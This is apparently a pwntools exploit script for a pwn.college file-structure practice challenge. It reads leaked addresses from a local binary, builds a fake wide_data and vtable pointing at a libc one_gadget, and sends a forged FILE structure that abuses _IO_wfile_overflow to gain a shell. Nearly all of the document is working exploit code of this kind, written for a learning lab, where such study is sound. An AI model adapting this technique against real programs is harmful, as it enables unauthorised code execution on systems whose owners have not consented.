from pwn import *

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#elf = ELF('./')

context.log_level = 'debug'

io = process('/home/sev1n/file/pwn/learning/pwn_college/file_struct/file_struct3/a.out')

def p():
    gdb.attach(proc.pidof(io)[0])

one_gadget = [0x50a37,0xebcf1,0xebcf5]

io.recvuntil(b"win func addr -->:")
win_addr = int(io.recvline()[:-1],16)
p()
success("win_addr -->" + hex(win_addr))

io.recvuntil(b"puts addr -->:")
puts_addr = int(io.recvline()[:-1],16)
libc_base = puts_addr -  0x80ed0
success("libc_base -->" + hex(libc_base))

io.recvuntil(b"Reading into stack buffer addr -->")
buf_addr = int(io.recvline()[:-1],16)
success("buf addr -->" + hex(buf_addr))

# prepare fake vtable

fake_vtable_addr = buf_addr + 0xe0
fake_wide_data = b'\x00' * 0xe0
fake_wide_data += p64(fake_vtable_addr)

fake_vtable = b'\x00' * 0x60
fake_vtable += p64(libc_base + one_gadget[1] )
fake_vtable += p64(fake_vtable_addr + 0x68)
payload = fake_wide_data + fake_vtable
io.send(payload)
#p()

# exploiting with IO_wfile_overflow 
fake_io_file = FileStructure()
# make _wide_data+0xe0 = fake_vtable 
# make _wide_data->write_base(+0x18) = 0

fake_io_file._wide_data = buf_addr

fake_io_file._lock = libc_base +  0x21ba80
_IO_wfile_over_flow = libc_base + 0x215f58
fake_io_file.vtable = _IO_wfile_over_flow - 0x38 # fwrite call vtable+0x38
fake_io_file.flags = 0

print(fake_io_file)

io.recvuntil(b"Reading over file pointer")
io.send(bytes(fake_io_file))

io.interactive()

